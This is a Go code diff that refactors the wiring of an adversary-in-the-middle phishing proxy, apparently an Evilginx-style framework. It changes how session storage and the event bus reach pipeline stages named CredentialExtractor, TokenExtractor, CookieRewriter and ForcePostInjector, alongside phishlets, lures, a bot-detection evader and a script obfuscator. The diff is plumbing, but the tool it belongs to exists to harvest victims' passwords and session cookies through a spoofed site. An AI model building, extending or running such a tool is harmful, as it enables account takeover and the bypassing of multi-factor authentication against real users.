@@ -66,7 +66,7 @@ type initializer struct {
 	dnsProviders  map[string]aitm.DNSProvider
 	botStore      *sqlite.Bots
 	botGuardSvc   *aitm.BotGuardService
-	sessionStore  aitm.SessionStore
+	sessionStore  *sqlite.Sessions
 	lureSvc       *aitm.LureService
 	blacklistSvc  *aitm.BlacklistService
 	spoofProxy    *proxy.SpoofProxy
@@ -249,7 +249,7 @@ func (ini *initializer) initServices() error {
 }
 
 func (ini *initializer) initProxy(version string) error {
-	apiHandler := api.NewRouter(api.RouterDeps{
+	apiHandler := &api.Router{
 		Sessions:  ini.sessionSvc,
 		Lures:     ini.lureSvc,
 		Phishlets: ini.Daemon.phishletSvc,
@@ -259,7 +259,7 @@ func (ini *initializer) initProxy(version string) error {
 		Domain:    ini.cfg.Domain,
 		Version:   version,
 		Logger:    ini.logger,
-	})
+	}
 
 	ini.obfuscator = &obfuscator.NoOpObfuscator{}
 	if ini.cfg.Obfuscator.Enabled {
@@ -275,11 +275,9 @@ func (ini *initializer) initProxy(version string) error {
 		botGuardSvc:      ini.botGuardSvc,
 		blacklistSvc:     ini.blacklistSvc,
 		sessionSvc:       ini.sessionSvc,
-		sessionStore:     ini.sessionStore,
 		phishletResolver: ini.resolver,
 		phishletSvc:      ini.Daemon.phishletSvc,
 		spoofProxy:       ini.spoofProxy,
-		bus:              ini.bus,
 		apiHandler:       apiHandler,
 		apiHostname:      ini.cfg.API.SecretHostname,
 		obfuscator:       ini.obfuscator,
@@ -316,7 +314,7 @@ func (ini *initializer) initWatcher() {
 		ini.logger.Warn("phishlet watcher unavailable — live reload disabled", "error", err)
 		return
 	}
-	ini.phishletReloadSub = events.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
+	ini.phishletReloadSub = aitm.SubscribeFunc(ini.bus, aitm.EventPhishletReloaded, func(ev aitm.Event) {
 		if p, ok := ev.Payload.(*aitm.Phishlet); ok {
 			ini.resolver.Register(p)
 		}
@@ -442,11 +440,9 @@ type pipelineDeps struct {
 	botGuardSvc      *aitm.BotGuardService
 	blacklistSvc     *aitm.BlacklistService
 	sessionSvc       *aitm.SessionService
-	sessionStore     aitm.SessionStore
 	phishletResolver *aitm.PhishletResolver
 	phishletSvc      *aitm.PhishletService
 	spoofProxy       *proxy.SpoofProxy
-	bus              aitm.EventBus
 	apiHandler       *api.Router
 	apiHostname      string
 	obfuscator       scriptObfuscator
@@ -478,8 +474,7 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 				Spoof: d.spoofProxy,
 			},
 			&request.SessionResolver{
-				Store:   d.sessionStore,
-				Factory: d.sessionSvc,
+				Sessions: d.sessionSvc,
 			},
 			&request.TelemetryScoreCheck{
 				Scorer:    d.botGuardSvc,
@@ -488,9 +483,8 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 			},
 			&request.URLRewriter{},
 			&request.CredentialExtractor{
-				Store:  d.sessionStore,
-				Bus:    d.bus,
-				Logger: logger,
+				Capturer: d.sessionSvc,
+				Logger:   logger,
 			},
 			&request.ForcePostInjector{},
 		},
@@ -499,9 +493,7 @@ func buildPipeline(d pipelineDeps, logger *slog.Logger) *proxy.Pipeline {
 			&response.CookieRewriter{},
 			&response.SubFilterApplier{},
 			&response.TokenExtractor{
-				Store:     d.sessionStore,
-				Bus:       d.bus,
-				Completer: d.sessionSvc,
+				Sessions:  d.sessionSvc,
 				Whitelist: d.blacklistSvc,
 				Logger:    logger,
 			},
